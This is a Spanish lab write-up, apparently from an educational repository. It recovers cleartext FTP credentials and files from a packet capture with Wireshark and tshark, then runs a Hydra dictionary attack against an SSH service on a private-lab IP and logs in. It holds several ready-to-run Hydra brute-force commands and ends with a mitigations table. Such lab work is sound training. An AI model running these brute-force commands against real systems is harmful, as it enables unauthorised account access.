# Análisis de tráfico FTP y ataque de fuerza bruta SSH con Hydra

Laboratorio práctico de **análisis forense de red** y **auditoría de contraseñas**, realizado en un entorno controlado de máquinas virtuales.

El objetivo es demostrar cómo un protocolo sin cifrar como FTP puede exponer credenciales y archivos transferidos, y cómo esa información puede utilizarse posteriormente para auditar la seguridad de un servicio SSH.

> **Aviso:** Esta práctica tiene fines exclusivamente educativos y se realiza en un entorno controlado de laboratorio (redes privadas `192.168.x.x` y máquinas virtuales propias). No debe utilizarse contra sistemas sin autorización explícita.

---

## Índice

- [Objetivo](#objetivo)
- [Entorno del laboratorio](#entorno-del-laboratorio)
- [Fase 1. Captura y análisis con Wireshark](#fase-1-captura-y-análisis-con-wireshark)
- [Fase 2. Extracción de archivos mediante FTP](#fase-2-extracción-de-archivos-mediante-ftp)
- [Fase 3. Ataque de fuerza bruta con Hydra](#fase-3-ataque-de-fuerza-bruta-con-hydra)
- [Fase 4. Acceso mediante SSH](#fase-4-acceso-mediante-ssh)
- [Resultados](#resultados)
- [Medidas de seguridad y mitigaciones](#medidas-de-seguridad-y-mitigaciones)
- [Estructura del repositorio](#estructura-del-repositorio)
- [Referencias](#referencias)

---

## Objetivo

Los objetivos principales de esta práctica son:

1. Capturar e inspeccionar comunicaciones FTP sin cifrar mediante Wireshark y tshark.
2. Identificar y reconstruir archivos transferidos mediante el flujo `FTP-DATA`.
3. Recuperar los archivos `usuarios.txt` y `password.txt` a partir de una captura de tráfico.
4. Utilizar ambas listas como diccionarios en una auditoría de contraseñas contra un servicio SSH mediante Hydra.
5. Comprobar el acceso a la máquina objetivo utilizando las credenciales obtenidas.

---

## Entorno del laboratorio

| Elemento            | Detalle                            |
| ------------------- | ---------------------------------- |
| Archivo de captura  | `quetengoaqui.pcapng`              |
| Protocolo analizado | FTP                                |
| Servidor FTP        | vsFTPd 3.0.5                       |
| IP del servidor FTP | `192.168.56.104`                   |
| Usuario FTP         | `aldar`                            |
| Contraseña FTP      | `mezga`                            |
| IP del objetivo SSH | `192.168.111.55`                   |
| Herramientas        | Wireshark, tshark, Hydra y OpenSSH |

---

## Fase 1. Captura y análisis con Wireshark

En primer lugar, se abre el archivo `quetengoaqui.pcapng` con Wireshark para analizar las comunicaciones y localizar las sesiones FTP.

Para filtrar el tráfico relacionado con este protocolo se utiliza el siguiente filtro:

```wireshark
ftp
```

Durante el análisis se identifica una sesión FTP en la que se realizan operaciones de autenticación y transferencia de archivos.

Las credenciales observadas durante la autenticación son:

| Campo      | Valor   |
| ---------- | ------- |
| Usuario    | `aldar` |
| Contraseña | `mezga` |

También se detectan dos operaciones importantes de subida de archivos mediante el comando `STOR`:

```text
STOR password.txt
STOR usuarios.txt
```

El comando `STOR` indica que el cliente está enviando archivos al servidor FTP.

Como FTP transmite los datos sin cifrar, tanto las credenciales como el contenido de los archivos pueden quedar expuestos y ser recuperados mediante el análisis de la captura.

---

## Fase 2. Extracción de archivos mediante FTP

Una vez identificadas las transferencias, se procede a reconstruir los archivos enviados a través de los flujos `FTP-DATA`.

Wireshark permite realizar esta operación directamente desde su interfaz gráfica:

**File → Export Objects → FTP-DATA**

También es posible utilizar tshark desde la terminal:

```bash
tshark -r quetengoaqui.pcapng --export-objects ftp-data,./extraidos
```

Este comando analiza la captura y exporta los archivos transferidos a la carpeta `extraidos`.

Los archivos recuperados son:

| Archivo        | Contenido                       |
| -------------- | ------------------------------- |
| `usuarios.txt` | Lista de 100 nombres de usuario |
| `password.txt` | Lista de 199 contraseñas        |

Antes de utilizar los archivos en Linux, es recomendable comprobar si contienen finales de línea de Windows (`CRLF`) y normalizarlos:

```bash
sed -i 's/\r$//' usuarios.txt password.txt
```

De esta forma, se evitan posibles problemas de formato al utilizar las listas con Hydra.

---

## Fase 3. Ataque de fuerza bruta con Hydra

Con los archivos recuperados y preparados, se realiza una auditoría de contraseñas contra el servicio SSH de la máquina objetivo.

Para ello se utiliza Hydra, una herramienta que permite comprobar combinaciones de usuarios y contraseñas mediante ataques de diccionario.

El comando utilizado en el laboratorio es:

```bash
hydra -L usuarios.txt -P password.txt -t 4 ssh://192.168.111.55
```

### Descripción de los parámetros

| Parámetro              | Descripción                                  |
| ---------------------- | -------------------------------------------- |
| `-L usuarios.txt`      | Archivo que contiene la lista de usuarios    |
| `-P password.txt`      | Archivo que contiene la lista de contraseñas |
| `-t 4`                 | Número de tareas paralelas utilizadas        |
| `ssh://192.168.111.55` | Servicio SSH y dirección IP del objetivo     |

### Otras opciones de Hydra

Para ejecutar el proceso en modo detallado y detenerlo al encontrar una combinación válida:

```bash
hydra -L usuarios.txt -P password.txt -t 4 -f -V ssh://192.168.111.55
```

Para utilizar un puerto SSH diferente al predeterminado (22):

```bash
hydra -L usuarios.txt -P password.txt -s 2222 -t 4 ssh://192.168.111.55
```

Para guardar los resultados en un archivo:

```bash
hydra -L usuarios.txt -P password.txt -t 4 -o resultado_hydra.txt ssh://192.168.111.55
```

Cuando Hydra encuentra unas credenciales válidas, muestra un resultado similar al siguiente:

```text
[22][ssh] host: 192.168.111.55
login: usuario
password: contraseña
```

---

## Fase 4. Acceso mediante SSH

Una vez identificadas las credenciales válidas, se comprueba el acceso a la máquina objetivo mediante SSH.

El comando utilizado es:

```bash
ssh <usuario>@192.168.111.55
```

Se introduce la contraseña obtenida durante la auditoría y se comprueba que la autenticación se realiza correctamente.

Esta última fase permite verificar que las credenciales encontradas mediante Hydra proporcionan acceso al sistema objetivo.

---

## Resultados

Al finalizar la práctica se han conseguido los siguientes resultados:

- [ ] Capturar y analizar tráfico FTP mediante Wireshark.
- [ ] Identificar las credenciales FTP transmitidas sin cifrar.
- [ ] Localizar las transferencias de archivos mediante los comandos `STOR`.
- [ ] Reconstruir los archivos `usuarios.txt` y `password.txt` desde la captura.
- [ ] Preparar las listas para su utilización en Linux.
- [ ] Ejecutar una auditoría de contraseñas contra el servicio SSH mediante Hydra.
- [ ] Comprobar el acceso a la máquina virtual objetivo mediante SSH.

---

## Medidas de seguridad y mitigaciones

Durante esta práctica se han identificado diferentes riesgos de seguridad que podrían afectar a una infraestructura real.

| Riesgo detectado                                 | Medida de mitigación                                                                  |
| ------------------------------------------------ | ------------------------------------------------------------------------------------- |
| FTP transmite credenciales y archivos sin cifrar | Sustituir FTP por SFTP o FTPS                                                         |
| Uso de contraseñas débiles                       | Establecer políticas de contraseñas robustas y utilizar gestores de contraseñas       |
| Posibles ataques de fuerza bruta contra SSH      | Configurar Fail2ban y limitar los intentos de autenticación                           |
| Autenticación SSH mediante contraseña            | Priorizar la autenticación mediante claves públicas                                   |
| Falta de segmentación de red                     | Implementar VLAN y reglas de firewall                                                 |
| Ausencia de monitorización                       | Incorporar herramientas IDS/IPS como Suricata y sistemas de monitorización como Wazuh |

---

## Estructura del repositorio

La estructura de archivos utilizada para esta práctica es la siguiente:

```text
.
├── quetengoaqui.pcapng
├── usuarios.txt
├── password.txt
└── README.md
```

| Archivo               | Descripción                                   |
| --------------------- | --------------------------------------------- |
| `quetengoaqui.pcapng` | Captura original del tráfico de red           |
| `usuarios.txt`        | Lista de usuarios recuperada de la captura    |
| `password.txt`        | Lista de contraseñas recuperada de la captura |
| `README.md`           | Documentación de la práctica                  |

---

## Referencias

- [Wireshark - Documentación oficial](https://www.wireshark.org/docs/)
- [THC-Hydra - Repositorio oficial de GitHub](https://github.com/vanhauser-thc/thc-hydra)
- [OWASP Web Security Testing Guide - Testing for Weak Lock Out Mechanism](https://owasp.org/www-project-web-security-testing-guide/)

---

**Práctica realizada con fines educativos en el ámbito de la ciberseguridad ofensiva y el análisis forense de redes.**
